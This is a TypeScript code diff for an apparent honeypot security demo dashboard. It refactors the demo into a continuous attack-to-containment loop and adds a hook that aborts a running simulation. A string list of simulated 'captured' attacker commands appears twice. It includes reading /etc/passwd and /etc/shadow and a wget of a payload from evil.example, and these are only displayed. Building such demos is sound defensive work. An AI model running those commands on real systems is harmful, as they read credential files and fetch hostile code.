@@ -199,6 +199,15 @@ class Store {
   // cleared together when demo mode is disabled.
   private demoSubTimers: ReturnType<typeof setTimeout>[] = [];
   private eventIdCounter = 0;
+  // Optional hook wired by the bootstrap that lets demo start cancel an
+  // in-flight Instant Attack without creating an import cycle.
+  private abortProviderSimulation: (() => void) | null = null;
+
+  // Registers a callback that aborts a running provider simulation. Called
+  // from main.tsx so the store never has to import the provider directly.
+  registerProviderAbort(hook: () => void) {
+    this.abortProviderSimulation = hook;
+  }
 
   getState(): AppState {
     return this.state;
@@ -394,6 +403,7 @@ class Store {
 
   // ── Demo Target Mode ──────────────────────────────────────────────────────
   enableTargetDemo() {
+    this.abortProviderSimulation?.();
     this.setTargetStatus({ status: "demo_connected", mode: "demo" });
     this.initializeDemoMode();
   }
@@ -405,6 +415,8 @@ class Store {
   // ── Demo Mode: instantly mark both agents "connected" client-side,
   // no API keys / network calls needed. Purely for presentations. ──────────
   enableDemoMode() {
+    // Cancel any in-flight Instant Attack so the two lifecycles never overlap.
+    this.abortProviderSimulation?.();
     (["red", "blue"] as const).forEach((team) => this.setAgentStatus(team, "connected"));
     this.initializeDemoMode();
   }
@@ -433,9 +445,49 @@ class Store {
     // Start from a clean slate so a re-run never stacks on old state.
     this.resetSimulation();
     const runId = ++this.demoRunId;
-    const wait = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
+    const wait = (ms: number) => new Promise<void>((resolve) => setTimeout(resolve, ms));
     const cancelled = () => this.demoRunId !== runId;
     const stamp = () => new Date().toLocaleTimeString("en-GB", { hour12: false });
+
+    const capturedCommands = [
+      "whoami",
+      "id",
+      "ls -la",
+      "cat /etc/passwd",
+      "uname -a",
+      "ifconfig",
+      "sudo cat /etc/shadow",
+      "wget http://evil.example/payload.sh",
+    ];
+
+    // Demo Mode is a CONTINUOUS loop: RED → BLUE → HONEYPOT → SAFE → RED → …
+    // Every cycle is one complete lifecycle; the next Red attack never starts
+    // before the previous Honeypot cycle has fully finished (see runDemoCycle).
+    while (!cancelled()) {
+      // Fresh cycle: clear the previous cycle's honeypot session + topology so
+      // no stale glow/animation leaks across lifecycles. Counters persist —
+      // each cycle is one coherent threat lifecycle.
+      this.clearHoneypotSession();
+      this.setTopology({ attackActive: false, attackTarget: null });
+      this.demoSubTimers = []; // every timer from the prior cycle has fired by now
+
+      await this.runDemoCycle({ wait, cancelled, stamp, capturedCommands });
+      if (cancelled()) return;
+
+      // Short clean transition in the SAFE state before the next RED.
+      await wait(1600);
+    }
+  }
+
+  // Executes exactly one full demo lifecycle: RED → BLUE → HONEYPOT →
+  // CAPTURE → CONTAINMENT → COMPLETED (SAFE). Returns once the cycle is done.
+  private async runDemoCycle(ctx: {
+    wait: (ms: number) => Promise<void>;
+    cancelled: () => boolean;
+    stamp: () => string;
+    capturedCommands: string[];
+  }) {
+    const { wait, cancelled, stamp, capturedCommands } = ctx;
 
     // Phase 1 — IDLE → ATTACK. Nothing is active before this point: the
     // honeypot stays on standby (no arming glow) so only Red glows now.
@@ -513,16 +565,6 @@ class Store {
       message: "Attacker session captured by honeypot — redirecting into deception environment",
     });
 
-    const capturedCommands = [
-      "whoami",
-      "id",
-      "ls -la",
-      "cat /etc/passwd",
-      "uname -a",
-      "ifconfig",
-      "sudo cat /etc/shadow",
-      "wget http://evil.example/payload.sh",
-    ];
     const shuffledCommands = [...capturedCommands].sort(() => Math.random() - 0.5).slice(0, 5);
     shuffledCommands.forEach((cmd, i) => {
       const t = setTimeout(() => {
